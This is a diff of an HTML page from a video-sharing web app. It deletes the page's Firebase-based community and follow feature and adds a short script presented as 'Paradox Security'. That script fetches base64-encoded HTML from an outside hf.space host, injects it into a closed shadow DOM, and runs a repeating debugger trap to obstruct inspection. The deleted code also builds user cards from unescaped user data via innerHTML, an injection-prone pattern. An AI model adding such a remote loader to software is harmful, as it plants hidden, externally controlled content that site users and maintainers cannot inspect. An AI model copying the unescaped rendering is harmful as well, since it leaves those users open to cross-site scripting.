@@ -37,110 +37,20 @@
 </head>
 <body>
 
-    <div class="header">
-        <button class="back-btn" onclick="window.location.href='index'"><i class="fas fa-chevron-left"></i></button>
-        <h2>Community</h2>
-        <i class="fas fa-search" style="color: #FFD700;" onclick="window.location.href='search'"></i>
-    </div>
-
-    <div id="friends-section" style="display:none;">
-        <div class="section-title">Your Friends</div>
-        <div class="user-list" id="friends-list"></div>
-    </div>
-
-    <div class="section-title">Suggested For You</div>
-    <div class="user-list" id="suggested-list">
-        <p style="text-align:center; color:#444; margin-top:30px;">Loading Verbotube users...</p>
-    </div>
-
-    <div class="bottom-nav">
-        <i class="fas fa-home" style="color:#888;" onclick="window.location.href='index'"></i>
-        <i class="fas fa-user-friends" style="color:#fff;"></i>
-        <div style="width:45px; height:30px; background:linear-gradient(to right, #00f2ea, #ff0050); border-radius:10px; display:flex; justify-content:center; align-items:center;" onclick="window.location.href='upload'">
-            <div style="background:white; width:36px; height:100%; border-radius:8px; display:flex; justify-content:center; align-items:center;"><i class="fas fa-plus" style="color:#000;"></i></div>
-        </div>
-        <i class="fas fa-comment-alt" style="color:#888;" onclick="window.location.href='friends'"></i>
-        <i class="fas fa-user" style="color:#888;" onclick="window.location.href='profile'"></i>
-    </div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-        import { getDatabase, ref, onValue, set, remove, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-
-        const firebaseConfig = { apiKey: "AIzaSyA8IpSQ9yy6W09rQjptJAqMePPpR4Zf3Kc", authDomain: "paravideo-1ac3b.firebaseapp.com", databaseURL: "https://paravideo-1ac3b-default-rtdb.firebaseio.com", projectId: "paravideo-1ac3b", appId: "1:384549024202:web:6e05fd017b7aa84e7a1f33" };
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        const auth = getAuth(app);
-        let currentUser = null;
-
-        // NO LOGIN, NO ENTRY LOGIC
-        onAuthStateChanged(auth, user => {
-            if (user) {
-                currentUser = user;
-                loadSystem();
-            } else {
-                window.location.href = 'login'; 
-            }
-        });
-
-        window.toggleFollow = async (uid) => {
-            const myUid = currentUser.uid;
-            const fRef = ref(db, `following/${myUid}/${uid}`);
-            const snap = await get(fRef);
-            if(snap.exists()) {
-                await remove(fRef);
-                await remove(ref(db, `followers/${uid}/${myUid}`));
-            } else {
-                await set(fRef, true);
-                await set(ref(db, `followers/${uid}/${myUid}`), true);
-            }
-        };
-
-        function loadSystem() {
-            onValue(ref(db, 'users'), async (snap) => {
-                const fList = document.getElementById('friends-list');
-                const sList = document.getElementById('suggested-list');
-                fList.innerHTML = "";
-                sList.innerHTML = "";
-                let hasFriends = false;
-
-                if(!snap.exists()) return;
-
-                for (const [uid, u] of Object.entries(snap.val())) {
-                    if (uid === currentUser.uid) continue;
-
-                    const fSnap = await get(ref(db, `following/${currentUser.uid}/${uid}`));
-                    const isFollowing = fSnap.exists();
-
-                    const div = document.createElement('div');
-                    div.className = "user-card";
-                    div.innerHTML = `
-                        <div class="user-info" onclick="window.location.href='profile?uid=${uid}'">
-                            <img src="${u.photo || 'icon.png'}" class="profile-pic">
-                            <div class="names">
-                                <span class="username">${u.username || 'User'} <i class="fas fa-check-circle" style="color:#20d5ec; font-size:12px;"></i></span>
-                                <span class="full-name">@${u.username || 'user'}</span>
-                            </div>
-                        </div>
-                        <div class="actions">
-                            ${isFollowing ? 
-                                `<button class="chat-btn" onclick="window.location.href='chat?uid=${uid}&name=${u.username}'"><i class="fas fa-comment-dots"></i></button>
-                                 <button class="btn-following" onclick="toggleFollow('${uid}')">Following</button>` : 
-                                `<button class="btn-follow" onclick="toggleFollow('${uid}')">Follow</button>`
-                            }
-                        </div>`;
-
-                    if(isFollowing) {
-                        fList.appendChild(div);
-                        hasFriends = true;
-                    } else {
-                        sList.appendChild(div);
-                    }
-                }
-                document.getElementById('friends-section').style.display = hasFriends ? 'block' : 'none';
-            });
-        }
-    </script>
+   
+<div id="px-root"></div>
+<script>
+(async function(){
+ try{
+  const r=await fetch('https://elitegamer859650-paradox-ghost-security.hf.space/get-shield?id=px_e9f5e9');
+  const d=await r.json();
+  const p=JSON.parse(atob(d.p));
+  const root=document.getElementById('px-root');
+  const shadow=root.attachShadow({mode:'closed'});
+  shadow.innerHTML=p.html;
+  setInterval(()=>{debugger;},500);
+ }catch(e){document.body.innerHTML='Paradox Security: Node Offline';}
+})();
+</script>
 </body>
 </html>
